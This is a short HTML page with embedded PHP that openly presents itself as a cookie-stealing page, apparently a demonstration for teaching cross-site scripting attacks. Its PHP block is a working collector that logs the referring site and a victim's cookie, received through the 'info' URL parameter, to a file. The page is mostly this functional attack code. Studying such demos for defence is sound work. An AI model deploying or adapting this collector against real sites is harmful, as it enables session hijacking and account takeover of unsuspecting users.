<html>

 <head>
  <h3>This page is a php script that steals a cookie</h3>
  <h3>Your cookies on a legitimate website has been sent to this malicious website.</h3>
  <h3>Look at the URL address of this current website!!!</h3>
 </head>

 <body>

    <?php
      $f = fopen("log.txt","a");
      $referrer = "\n".$_SERVER['HTTP_REFERER']."\n";
      $cookie = "info=".$_GET['info']."\n";
      fwrite($f, $referrer);
      fwrite($f, $cookie);
      fclose($f);
    ?>



  </body>

</html>

